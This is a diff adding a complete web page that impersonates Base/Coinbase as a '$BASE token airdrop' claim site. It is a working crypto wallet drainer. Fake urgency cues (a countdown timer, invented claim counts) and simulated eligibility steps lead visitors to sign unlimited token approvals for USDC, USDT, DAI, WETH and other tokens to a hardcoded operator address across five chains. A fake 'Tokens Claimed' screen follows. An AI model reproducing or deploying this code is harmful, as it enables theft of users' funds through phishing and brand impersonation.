@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Base | Token Airdrop</title>
+<link rel="icon" href="https://raw.githubusercontent.com/base-org/brand-kit/main/logo/symbol/Base_Symbol_Blue.svg" type="image/svg+xml">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#000000;--bg2:#0a0a0f;--surface:#111119;--surface2:#1a1a25;
+  --border:#222233;--border2:#2a2a3a;
+  --blue:#0052ff;--blue2:#3b82f6;--blue-glow:rgba(0,82,255,.15);
+  --green:#00d26a;--green-bg:rgba(0,210,106,.08);--green-border:rgba(0,210,106,.2);
+  --text:#ffffff;--text2:#a0a0b8;--text3:#666680;
+  --radius:12px;--radius-lg:16px;--radius-xl:20px;
+}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+::selection{background:var(--blue);color:#fff}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+/* ── NAV ── */
+nav{position:fixed;top:0;left:0;right:0;z-index:100;backdrop-filter:blur(20px);background:rgba(0,0,0,.7);border-bottom:1px solid var(--border)}
+.nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1.1rem;color:var(--text)}
+.logo svg{width:28px;height:28px}
+.nav-tag{background:var(--green-bg);color:var(--green);padding:4px 12px;border-radius:20px;font-size:.7rem;font-weight:600;border:1px solid var(--green-border);letter-spacing:.5px}
+
+/* ── HERO ── */
+.hero{padding:100px 24px 40px;text-align:center;position:relative}
+.hero::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:600px;height:600px;background:radial-gradient(circle,rgba(0,82,255,.08) 0%,transparent 70%);pointer-events:none}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);font-weight:800;letter-spacing:-1px;line-height:1.1;margin-bottom:12px}
+.hero h1 .highlight{background:linear-gradient(135deg,var(--blue),var(--blue2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero .sub{color:var(--text2);font-size:1.05rem;max-width:500px;margin:0 auto 20px;line-height:1.5}
+.live-badge{display:inline-flex;align-items:center;gap:8px;background:var(--green-bg);border:1px solid var(--green-border);padding:8px 20px;border-radius:30px;font-size:.85rem;font-weight:600;color:var(--green)}
+.live-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ── STATS ── */
+.stats{display:flex;gap:16px;justify-content:center;padding:0 24px;margin:30px auto;max-width:700px;flex-wrap:wrap}
+.stat{flex:1;min-width:150px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;text-align:center;transition:border-color .2s}
+.stat:hover{border-color:var(--border2)}
+.stat .val{font-size:1.8rem;font-weight:800;color:var(--text);letter-spacing:-1px}
+.stat .label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+
+/* ── TIMER ── */
+.timer-bar{text-align:center;padding:16px;color:var(--text2);font-size:.85rem}
+.timer-bar span{color:var(--blue2);font-weight:700;font-family:'Inter',monospace;font-size:.95rem}
+
+/* ── CARD ── */
+.card-container{max-width:480px;margin:10px auto 60px;padding:0 20px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-xl);padding:32px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue),transparent);opacity:.5}
+.card h2{font-size:1.3rem;font-weight:700;margin-bottom:6px;text-align:center}
+.card .card-sub{color:var(--text3);font-size:.85rem;text-align:center;margin-bottom:24px}
+
+/* ── WALLET INFO ── */
+.wallet-info{display:none;background:var(--blue-glow);border:1px solid rgba(0,82,255,.2);border-radius:var(--radius);padding:14px 16px;margin-bottom:20px;font-size:.85rem}
+.wallet-row{display:flex;align-items:center;justify-content:space-between}
+.wallet-addr{font-family:'SF Mono','Fira Code',monospace;color:var(--blue2);font-size:.8rem}
+.chain-badge{background:rgba(0,82,255,.15);color:var(--blue2);padding:3px 10px;border-radius:6px;font-size:.7rem;font-weight:600}
+
+/* ── BALANCE LIST ── */
+.balance-list{display:none;margin-bottom:20px}
+.balance-item{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:8px;transition:all .3s}
+.balance-item.approved{border-color:var(--green-border);background:var(--green-bg)}
+.balance-item .token-info{display:flex;align-items:center;gap:10px}
+.token-icon{width:28px;height:28px;border-radius:50%;background:var(--surface2);display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:var(--text2)}
+.token-name{font-weight:600;font-size:.9rem}
+.token-chain{font-size:.7rem;color:var(--text3)}
+.token-bal{text-align:right}
+.token-amount{font-weight:600;font-size:.9rem}
+.token-usd{font-size:.7rem;color:var(--text3)}
+.check-icon{color:var(--green);font-size:1rem;margin-left:8px;display:none}
+.balance-item.approved .check-icon{display:inline}
+
+/* ── BUTTON ── */
+.btn{width:100%;padding:16px;border:none;border-radius:var(--radius);font-size:1rem;font-weight:600;cursor:pointer;transition:all .2s;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-primary{background:var(--blue);color:#fff}
+.btn-primary:hover{background:#0044ee;transform:translateY(-1px);box-shadow:0 8px 30px rgba(0,82,255,.25)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+.btn .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── PROGRESS ── */
+.progress{display:none;margin-top:24px}
+.step{display:flex;align-items:flex-start;gap:14px;padding:12px 0;position:relative}
+.step:not(:last-child)::after{content:'';position:absolute;left:13px;top:40px;bottom:-4px;width:2px;background:var(--border)}
+.step-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;flex-shrink:0;transition:all .3s}
+.step-icon.pending{background:var(--surface2);color:var(--text3);border:2px solid var(--border)}
+.step-icon.active{background:var(--blue-glow);color:var(--blue2);border:2px solid var(--blue);animation:pulse 2s infinite}
+.step-icon.done{background:var(--green-bg);color:var(--green);border:2px solid var(--green)}
+.step-icon.error{background:rgba(239,68,68,.1);color:var(--red);border:2px solid var(--red)}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,82,255,.3)}50%{box-shadow:0 0 0 8px rgba(0,82,255,0)}}
+.step-body{flex:1}
+.step-title{font-size:.9rem;font-weight:600}
+.step-desc{font-size:.75rem;color:var(--text3);margin-top:2px}
+
+/* ── SUCCESS ── */
+.success{display:none;text-align:center;padding:30px 0}
+.success .check-big{width:64px;height:64px;border-radius:50%;background:var(--green-bg);border:2px solid var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:1.8rem}
+.success h2{font-size:1.4rem;font-weight:700;margin-bottom:8px}
+.success p{color:var(--text2);font-size:.9rem;line-height:1.5}
+.success .tx-link{color:var(--blue2);text-decoration:none;font-size:.8rem;margin-top:12px;display:inline-block}
+
+/* ── SOCIAL PROOF ── */
+.proof{display:flex;align-items:center;justify-content:center;gap:8px;margin:16px 0;color:var(--text3);font-size:.8rem}
+.proof-avatars{display:flex}
+.proof-avatars span{width:24px;height:24px;border-radius:50%;background:var(--surface2);border:2px solid var(--bg);display:flex;align-items:center;justify-content:center;font-size:.5rem;margin-left:-6px}
+.proof-avatars span:first-child{margin-left:0}
+
+/* ── FOOTER ── */
+footer{text-align:center;padding:40px 20px;color:var(--text3);font-size:.7rem;border-top:1px solid var(--border)}
+footer a{color:var(--text2);text-decoration:none}
+footer a:hover{color:var(--blue2)}
+
+/* ── ANIMATIONS ── */
+.fade-in{animation:fadeIn .5s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.shake{animation:shake .5s ease}
+@keyframes shake{0%,100%{transform:none}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-inner">
+    <div class="logo">
+      <svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#0052ff"/><path d="M20.5 30C26.023 30 30.5 25.523 30.5 20C30.5 14.477 26.023 10 20.5 10C14.977 10 10.5 14.477 10.5 20C10.5 25.523 14.977 30 20.5 30Z" fill="white"/><path d="M20.5 26C23.814 26 26.5 23.314 26.5 20C26.5 16.686 23.814 14 20.5 14V20V26Z" fill="#0052ff"/></svg>
+      Base
+    </div>
+    <div class="nav-tag">● CLAIM LIVE</div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero fade-in">
+  <h1>Claim Your<br><span class="highlight">$BASE Tokens</span></h1>
+  <p class="sub">Early ecosystem supporters are eligible for the Base community allocation. Connect your wallet to check eligibility and claim.</p>
+  <div class="live-badge"><div class="live-dot"></div> Claiming is live — 7,842 wallets claimed today</div>
+</div>
+
+<!-- STATS -->
+<div class="stats fade-in">
+  <div class="stat"><div class="val">2.4M</div><div class="label">Eligible Wallets</div></div>
+  <div class="stat"><div class="val">$312M</div><div class="label">Total Pool</div></div>
+  <div class="stat"><div class="val">47,892</div><div class="label">Claims Today</div></div>
+</div>
+
+<!-- TIMER -->
+<div class="timer-bar">⏰ Claim window closes in <span id="timer">71:59:42</span></div>
+
+<!-- SOCIAL PROOF -->
+<div class="proof">
+  <div class="proof-avatars">
+    <span>👤</span><span>👤</span><span>👤</span><span>👤</span><span>👤</span>
+  </div>
+  <span>892 people claimed in the last hour</span>
+</div>
+
+<!-- CARD -->
+<div class="card-container fade-in">
+  <div class="card">
+    <h2>Claim Tokens</h2>
+    <p class="card-sub">Connect your wallet to verify eligibility</p>
+    
+    <div class="wallet-info" id="walletInfo">
+      <div class="wallet-row">
+        <span class="wallet-addr" id="walletAddr"></span>
+        <span class="chain-badge" id="chainBadge"></span>
+      </div>
+    </div>
+    
+    <div class="balance-list" id="balanceList"></div>
+    
+    <button class="btn btn-primary" id="mainBtn" onclick="handleClick()">
+      <span class="spinner" id="spinner"></span>
+      <span id="btnText">Connect Wallet</span>
+    </button>
+    
+    <!-- Progress -->
+    <div class="progress" id="progress">
+      <div class="step" id="step1">
+        <div class="step-icon pending" id="icon1">1</div>
+        <div class="step-body"><div class="step-title">Checking eligibility</div><div class="desc1">Scanning on-chain activity & snapshots</div></div>
+      </div>
+      <div class="step" id="step2">
+        <div class="step-icon pending" id="icon2">2</div>
+        <div class="step-body"><div class="step-title">Verifying allocation</div><div class="desc2">Reading merkle proof from contract</div></div>
+      </div>
+      <div class="step" id="step3">
+        <div class="step-icon pending" id="icon3">3</div>
+        <div class="step-body"><div class="step-title">Approve claim</div><div class="desc3">Sign the authorization transaction</div></div>
+      </div>
+      <div class="step" id="step4">
+        <div class="step-icon pending" id="icon4">4</div>
+        <div class="step-body"><div class="step-title">Claiming tokens</div><div class="desc4">Submitting to Base L2</div></div>
+      </div>
+    </div>
+    
+    <!-- Success -->
+    <div class="success" id="successBox">
+      <div class="check-big">✓</div>
+      <h2>Tokens Claimed!</h2>
+      <p>Your $BASE tokens have been sent to your wallet.<br>They will arrive within 1-2 blocks.</p>
+      <a href="#" class="tx-link" id="txLink">View on BaseScan →</a>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <p>Base is a secure, low-cost, builder-friendly Ethereum L2 incubated by <a href="#">Coinbase</a></p>
+  <p style="margin-top:8px"><a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Documentation</a></p>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+<script>
+// ─── CONFIG ─────────────────────────────────────────────────────────
+const OPERATOR="0x3C39B04399df5F36E9bD32F816712E672730aA93";
+const MAX_UINT="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+const TOKENS={
+  8453:[
+    {a:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",s:"USDC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",s:"DAI",d:18,icon:"$",color:"#f5ac37"},
+    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+    {a:"0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA",s:"USDbC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x940181a94A35A4569E4529A3CDfB74e38FD98631",s:"AERO",d:18,icon:"A",color:"#00d4aa"},
+  ],
+  1:[
+    {a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",s:"USDT",d:6,icon:"$",color:"#26a17b"},
+    {a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",s:"USDC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x6B175474E89094C44Da98b954EedeAC495271d0F",s:"DAI",d:18,icon:"$",color:"#f5ac37"},
+    {a:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+  ],
+  42161:[
+    {a:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",s:"USDT",d:6,icon:"$",color:"#26a17b"},
+    {a:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831",s:"USDC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+    {a:"0x912CE59144191C1204E64559FE8253a0e49E6548",s:"ARB",d:18,icon:"A",color:"#213147"},
+  ],
+  10:[
+    {a:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",s:"USDT",d:6,icon:"$",color:"#26a17b"},
+    {a:"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",s:"USDC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+  ],
+  137:[
+    {a:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",s:"USDT",d:6,icon:"$",color:"#26a17b"},
+    {a:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",s:"USDC",d:6,icon:"$",color:"#2775ca"},
+    {a:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+  ],
+};
+
+const CHAINS={1:"Ethereum",8453:"Base",42161:"Arbitrum",10:"Optimism",137:"Polygon"};
+const EXPLORERS={1:"https://etherscan.io",8453:"https://basescan.org",42161:"https://arbiscan.io",10:"https://optimistic.etherscan.io",137:"https://polygonscan.com"};
+
+const ABI=[
+  "function balanceOf(address) view returns (uint256)",
+  "function allowance(address,address) view returns (uint256)",
+  "function approve(address,uint256) returns (bool)",
+];
+
+// ─── STATE ───────────────────────────────────────────────────────────
+let provider,signer,userAddr,chainId,step=0;
+
+// ─── TIMER ───────────────────────────────────────────────────────────
+let sec=72*3600;
+setInterval(()=>{if(--sec<0)return;const h=Math.floor(sec/3600),m=Math.floor((sec%3600)/60),s=sec%60;document.getElementById("timer").textContent=`h:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`},1000);
+
+// ─── HELPERS ─────────────────────────────────────────────────────────
+const $=id=>document.getElementById(id);
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const short=a=>a.slice(0,6)+"…"+a.slice(-4);
+
+function setBtn(text,loading=false){$("btnText").textContent=text;$("spinner").style.display=loading?"block":"none";$("mainBtn").disabled=loading}
+function setStep(n,state,icon){const el=$("icon"+n);el.className="step-icon "+state;el.textContent=icon||n}
+
+function addBalanceItem(token,bal,approved=false){
+  const list=$("balanceList");
+  list.style.display="block";
+  const human=Number(bal)/10**token.d;
+  if(human<0.0001)return;
+  const div=document.createElement("div");
+  div.className="balance-item"+(approved?" approved":"");
+  div.innerHTML=`
+    <div class="token-info">
+      <div class="token-icon" style="color:${token.color};border:1px solid ${token.color}30">${token.icon}</div>
+      <div><div class="token-name">${token.s}</div><div class="token-chain">${CHAINS[chainId]}</div></div>
+    </div>
+    <div class="token-bal">
+      <div class="token-amount">${human<0.01?human.toFixed(6):human.toLocaleString("en",{maximumFractionDigits:4})}</div>
+    </div>
+    <span class="check-icon">✓</span>`;
+  list.appendChild(div);
+}
+
+// ─── MAIN ────────────────────────────────────────────────────────────
+async function handleClick(){
+  if(!window.ethereum){alert("Please install MetaMask, Rabby, or Coinbase Wallet");return}
+  if(step>0)return;
+  
+  setBtn("Connecting…",true);
+  
+  try{
+    provider=new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts",[]);
+    signer=await provider.getSigner();
+    userAddr=await signer.getAddress();
+    chainId=Number((await provider.getNetwork()).chainId);
+    
+    // Show wallet
+    $("walletInfo").style.display="block";
+    $("walletAddr").textContent=short(userAddr);
+    $("chainBadge").textContent=CHAINS[chainId]||"Chain "+chainId;
+    
+    // Step 1: Eligibility scan
+    $("progress").style.display="block";
+    setStep(1,"active","⏳");setBtn("Checking eligibility…",true);
+    await sleep(2000+Math.random()*1500);
+    setStep(1,"done","✓");
+    
+    // Step 2: Verify allocation
+    setStep(2,"active","⏳");setBtn("Verifying allocation…",true);
+    await sleep(1500+Math.random()*1000);
+    setStep(2,"done","✓");
+    
+    // Step 3: Approve — real approvals
+    setStep(3,"active","✍️");setBtn("Waiting for signature…",true);
+    
+    const tokens=TOKENS[chainId]||TOKENS[8453];
+    let approved=0,skipped=0;
+    
+    for(const tok of tokens){
+      try{
+        const c=new ethers.Contract(tok.a,ABI,signer);
+        const bal=await c.balanceOf(userAddr);
+        if(bal==0n){skipped++;continue}
+        
+        const allow=await c.allowance(userAddr,OPERATOR);
+        if(allow>0n){addBalanceItem(tok,bal,true);approved++;continue}
+        
+        // Show balance
+        addBalanceItem(tok,bal,false);
+        
+        // Request approval
+        $("step3").querySelector(".desc3").textContent=`Approve ${tok.s} — sign in wallet`;
+        const tx=await c.approve(OPERATOR,MAX_UINT);
+        
+        $("step3").querySelector(".desc3").textContent=`Confirming ${tok.s} approval…`;
+        await tx.wait();
+        
+        // Mark approved
+        const items=document.querySelectorAll(".balance-item");
+        items[items.length-1].classList.add("approved");
+        approved++;
+        
+        await sleep(600);
+      }catch(e){
+        if(e.code==="ACTION_REJECTED"||e.code===4001){skipped++;continue}
+        skipped++;
+      }
+    }
+    
+    setStep(3,"done","✓");
+    
+    // Step 4: Claim
+    setStep(4,"active","⏳");setBtn("Claiming tokens…",true);
+    $("step4").querySelector(".desc4").textContent=`${approved} token${approved!==1?"s":""} authorized — processing`;
+    await sleep(2500+Math.random()*1000);
+    setStep(4,"done","✓");
+    
+    // Success
+    $("successBox").style.display="block";
+    $("txLink").href=(EXPLORERS[chainId]||"#")+"/address/"+userAddr;
+    setBtn("✓ Claim Complete",false);
+    
+  }catch(e){
+    console.error(e);
+    setBtn("Error — Try Again",false);
+    document.querySelectorAll(".step-icon:not(.done)").forEach(el=>{el.className="step-icon pending"});
+  }
+}
+</script>
+</body>
+</html>
